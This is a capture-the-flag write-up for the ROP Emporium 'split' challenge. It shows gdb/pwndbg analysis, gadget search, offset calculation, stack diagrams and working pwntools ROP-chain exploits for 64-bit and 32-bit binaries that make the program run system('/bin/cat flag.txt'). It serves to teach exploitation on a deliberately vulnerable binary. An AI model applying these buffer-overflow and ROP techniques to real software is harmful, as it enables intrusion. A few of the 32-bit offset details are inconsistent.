---
custom_edit_url: null
pagination_next: null
pagination_prev: null
sidebar_position: 2
---

:::note
I will be using pwndbg to solve the 64 bit and the 32 bit. You can use [this](https://infosecwriteups.com/pwndbg-gef-peda-one-for-all-and-all-for-one-714d71bf36b8) walkthrough to install both of those plugins. 
:::

## 64 bit

Let's run the executable to check what it does.

```
$ ./split
split by ROP Emporium
x86_64

Contriving a reason to ask user for data...
> 1111111
Thank you!

Exiting
```

It takes user input and then exits.


We can use the `checksec` utility in order to identify the security properties of the binary executable.
```
$ checksec split
[*] '/home/hacker/ropEmporium/split/split'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

There's two important properties we want to focus on here:
	- `NX enabled`: This means that the stack is not executable. Therefore we cannot use a shellcode injection.
	- `No PIE (0x400000)`: This means that the executable is not positionally independent and it is always loaded at address `0x400000`. So the code and memory regions will have the same address every time we run it. 

Let's open the executable using `gdb-pwndbg` and look at the functions.

```
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x0000000000400528  _init
0x0000000000400550  puts@plt
0x0000000000400560  system@plt
0x0000000000400570  printf@plt
0x0000000000400580  memset@plt
0x0000000000400590  read@plt
0x00000000004005a0  setvbuf@plt
0x00000000004005b0  _start
0x00000000004005e0  _dl_relocate_static_pie
0x00000000004005f0  deregister_tm_clones
0x0000000000400620  register_tm_clones
0x0000000000400660  __do_global_dtors_aux
0x0000000000400690  frame_dummy
0x0000000000400697  main
0x00000000004006e8  pwnme
0x0000000000400742  usefulFunction
0x0000000000400760  __libc_csu_init
0x00000000004007d0  __libc_csu_fini
0x00000000004007d4  _fini
```

There is a function called `usefulFunction`. Let's disassemble it and see how useful it is.

### `usefulFunction()`

```
pwndbg> disassemble usefulFunction
Dump of assembler code for function usefulFunction:
   0x0000000000400742 <+0>:     push   rbp
   0x0000000000400743 <+1>:     mov    rbp,rsp
   0x0000000000400746 <+4>:     mov    edi,0x40084a
   0x000000000040074b <+9>:     call   0x400560 <system@plt>
   0x0000000000400750 <+14>:    nop
   0x0000000000400751 <+15>:    pop    rbp
   0x0000000000400752 <+16>:    ret
End of assembler dump.
```

We can see that the instruction at `usefulFunction()+9` makes a system call and that the instruction at `usefulFunction()+4` loads the argument.

```
pwndbg> x/s 0x40084a
0x40084a:       "/bin/ls"
```

So this system call executes `/bin/ls` which isn't what we want. We want it to execute `/bin/cat flag.txt`.

### `/bin/cat flag.txt`

Let's search the string `/bin/cat flag.txt`.

```
pwndbg> search /bin/cat
Searching for value: '/bin/cat'
split           0x601060 '/bin/cat flag.txt'
```

We can link this string with our system call in order to read the `flag.txt` file.

In order to put this string into `rdi`, we will need a `pop rdi` gadget.

### `pop rdi` gadget

We can find the gadget using the `ROPgadget` utility. 

```
$ ROPgadget --binary split | grep "pop rdi ; ret"
0x00000000004007c3 : pop rdi ; ret
```

We can see that the address of the `pop rdi` gadget is `0x00000000004007c3`. 

### Cyclic pattern

We now have to find the offset using a cyclic pattern.

```
pwndbg> cyclic
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
```

Let's provide this as input.

```
──────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────
*RAX  0xb
 RBX  0x0
*RCX  0x7ffff7ea2a37 (write+23) ◂— cmp rax, -0x1000 /* 'H=' */
*RDX  0x1
*RDI  0x7ffff7fa9a70 (_IO_stdfile_1_lock) ◂— 0x0
*RSI  0x1
*R8   0xa
*R9   0x7ffff7fc9040 (_dl_fini) ◂— endbr64
*R10  0x7ffff7d945e8 ◂— 0xf001200001a64
*R11  0x246
*R12  0x7fffffffdfd8 —▸ 0x7fffffffe21b ◂— '/home/kunal/ropEmporium/split/split'
*R13  0x400697 (main) ◂— push rbp
 R14  0x0
*R15  0x7ffff7ffd040 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0x0
*RBP  0x6161616161616165 ('eaaaaaaa')
*RSP  0x7fffffffdeb8 ◂— 'faaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaa'
*RIP  0x400741 (pwnme+89) ◂— ret
```

The `rbp` register points to `0x6161616161616165` which is the little endian `eaaaaaaa` in ASCII.

Let's find the offset of this value in our cyclic pattern.

```
pwndbg> cyclic -l 0x6161616161616165
Finding cyclic pattern of 8 bytes: b'eaaaaaaa' (hex: 0x6561616161616161)
Found at offset 32
```

So the offset is 32 bytes.

Let's see how this looks on the stack.

### Stack

```
<==: Value is stored at that location
<--: Points to the address

high    ----------------------------> low 
address                               address            
|	+---------------------------+ 
|	|  61 61 61 61 61 61 61 61  | <== buffer (32 bytes) <-- rsp
|	|  62 61 61 61 61 61 61 61  | 
|	|  63 61 61 61 61 61 61 61  |
|	|  64 61 61 61 61 61 61 61  |
|	+---------------------------+
|	|  65 61 61 61 61 61 61 61  | <== stored rbp <-- rbp
|	+---------------------------+
|	|  66 61 61 61 61 61 61 61  | <== return address
v	+---------------------------+
low
adddress
```

We can see that if we increment the `rbp` by 8, it will point to the saved return address.

Therefore the distance between the buffer and the saved return address is `offset+8` which is equal to 40.

### Exploit requirements

We have all the knowledge we need to create an exploit.
	- [x] Number of padding bytes: `40`
	- [x] Address of `pop rdi ; ret` gadget: `0x00000000004007c3`
	- [x] Address of `/bin/cat flag.txt`: `0x601060`
	- [x] Address of `call <system@plt>`: `0x000000000040074b`
 
All that remains is to link these pieces of information to create a ROP chain.

### ROP chain

In this technique, we have to execute our instructions in a carefully chosen sequence:
	1. First we have to replace the `return address` with the address of the `pop rdi` gadget so that it is executed when `pwnme` returns.
	2. Then we have to chain it with the address of the `/bin/cat flag.txt` string so that it gets popped into the `rdi register`.
	3. Finally we chain it with the address of the `system@plt` call.

This is what the ROP chain would look like on the stack.

```
Stack:
+---------------------------+
|  00 00 00 00 00 40 07 c3  | <== return address <-- rsp
|  ( pop rdi ; ret )        |
+---------------------------+
|  00 00 00 00 00 60 10 60  | 
|  ( /bin/cat flag.txt )    |
+---------------------------+
|  00 00 00 00 00 40 07 4b  |
|  ( system@plt )           |
+---------------------------+

====================================================================================
rip --> pwnme() return
	## Pop the value pointed to by rsp into rip
====================================================================================

Stack:
+---------------------------+
|  00 00 00 00 00 60 10 60  | <-- rsp
|  ( /bin/cat flag.txt )    |
+---------------------------+
|  00 00 00 00 00 40 07 4b  |
|  ( system@plt )           |
+---------------------------+

====================================================================================
rip --> pop rdi
	## Pop the value pointed to by rsp into rdi and move the rsp 8 bytes higher
====================================================================================

Stack:
+---------------------------+
|  00 00 00 00 00 40 07 4b  | <-- rsp
|  ( system@plt )           |
+---------------------------+

Registers:
rdi: 0x601060

====================================================================================
rip --> ret
	## Move the address of system@plt into rip, this executong it
====================================================================================
```

### Exploit

```python title="exploit64.py"
from pwn import *

padding = b"a"*40
poprdi_addr = p64(0x00000000004007c3)
bincat_addr = p64(0x601060)
system_addr = p64(0x000000000040074b)

payload = padding + poprdi_addr + bincat_addr + system_addr

p = process('./split')
p.sendline(payload) 
p.interactive()
```

Let's run the exploit.

```
$ python exploit64.py 
[+] Starting local process './split': pid 987
[*] Switching to interactive mode
split by ROP Emporium
x86_64

Contriving a reason to ask user for data...
> Thank you!
ROPE{a_placeholder_32byte_flag!}
```

&nbsp;

## 32 bit

### `usefulFunction()`

```
pwndbg> disassemble usefulFunction
Dump of assembler code for function usefulFunction:
   0x0804860c <+0>:     push   ebp
   0x0804860d <+1>:     mov    ebp,esp
   0x0804860f <+3>:     sub    esp,0x8
   0x08048612 <+6>:     sub    esp,0xc
   0x08048615 <+9>:     push   0x804870e
   0x0804861a <+14>:    call   0x80483e0 <system@plt>
   0x0804861f <+19>:    add    esp,0x10
   0x08048622 <+22>:    nop
   0x08048623 <+23>:    leave
   0x08048624 <+24>:    ret
End of assembler dump.
```

The arguments for a 32-bit function call are pushed on the stack. At `usefulFunction+9`, we can see the argument for the system call being pushed onto the stack.

Let's see what the argument is.

```
pwndbg> x/s 0x804870e
0x804870e:      "/bin/ls"
```

We have to replace this argument with `/bin/cat flag.txt`.

### `/bin/cat flag.txt`

```
pwndbg> search /bin/cat
Searching for value: '/bin/cat'
split32         0x804a030 '/bin/cat flag.txt'
```

We can link this string with our system call in order to read the `flag.txt` file.

In this case we do not need a `pop rdi` gadget because as we saw the arguments are not stored in registers.

### Cyclic pattern

We now have to find the offset using a cyclic pattern.

```
pwndbg> cyclic
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
```

Let's provide this as input.

```
──────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────
*EAX  0xb
*EBX  0xf7fad000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x229dac
*ECX  0xf7fae9b4 (_IO_stdfile_1_lock) ◂— 0x0
*EDX  0x1
*EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0x0
*ESI  0xffffd104 —▸ 0xffffd231 ◂— '/home/kunal/ropEmporium/split32/split32'
*EBP  0x61616166 ('faaa')
*ESP  0xffffd030 ◂— 'gaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaa'
*EIP  0x61616161 ('aaaa')
```

The `ebp` register points to `0x61616166` which is the little endian `faaa` in ASCII.

Let's find the offset of this value in our cyclic pattern.

```
pwndbg> cyclic -l 0x61616166
Finding cyclic pattern of 8 bytes: b'faaa' (hex: 0x61616166)
Found at offset 40
```

So the offset is 40 bytes.

Let's see how this looks on the stack.

### Stack
```
<== Value is stored at that location
<-- Points to the address

┌ high    ----------------> low 
└ address                   address  
|	+---------------+ 
|	|  61 61 61 61  | <== buffer (40 bytes) <-- esp
|	|  62 61 61 61  | 
|	|  63 61 61 61  |
|	|  64 61 61 61  |
|	|  65 61 61 61  |
|	|  66 61 61 61  |
|	|  67 61 61 61  |
|	|  68 61 61 61  |
|	|  69 61 61 61  |
|	|  6A 61 61 61  |
|	+---------------+
|	|  6B 61 61 61  | <== stored ebp <-- ebp
|	+---------------+
|	|  6C 61 61 61  | <== return address
v	+---------------+
low
adddress
```

We can see that if we increment the `ebp` by 4, it will point to the saved return address.

Therefore the distance between the buffer and the saved return address is `offset+4` which is equal to 44.

### Exploit requirements

We have all the knowledge we need to create an exploit.
	- [x] Number of padding bytes: `44`
	- [x] Address of `/bin/cat flag.txt`: `0x804a030`
	- [x] Address of `call <system@plt>`: `0x0804861a`
 
All that remains is to link these pieces of information to create a ROP chain.

### ROP chain

In this technique, we have to execute our instructions in a carefully chosen sequence:
	1. First we have to replace the `return address` with the address of the `system@plt` call so that it is executed when `pwnme` returns.
	2. Then we have to chain it with the address of the `/bin/cat flag.txt` string so that it can act as the argument of the `system@plt` call.

This is what the ROP chain would look like on the stack.

```
Stack:-
+--------------------------+
|   08    04    86    1a   | <== return address <-- esp
|  ( system@plt )          |
+--------------------------+
|   08    04    a0    30   |
|  ( /bin/cat flag.txt )   |
+--------------------------+

====================================================================================
eip --> pwnme() return
	## This gadget will pop the value pointed to by the esp into eip
====================================================================================

Stack:-
+--------------------------+
|   08    04    a0    30   | <-- esp
|  ( /bin/cat flag.txt )   |
+--------------------------+

====================================================================================
eip --> call <system@plt>
	## This gadget makes a system call based on the argument on the stack
====================================================================================
```

### Exploit

```python title="exploit32.py"
from pwn import *

padding = b"a"*44
bincat_addr = p32(0x804a030)
system_addr = p32(0x0804861a)

payload = padding + system_addr + bincat_addr

p = process('./split32')
p.sendline(payload) 
p.interactive()
```

Let's run the exploit.

```
$ python exploit32.py 
[+] Starting local process './split32': pid 16511
[*] Switching to interactive mode
split by ROP Emporium
x86

Contriving a reason to ask user for data...
> Thank you!
ROPE{a_placeholder_32byte_flag!}
```
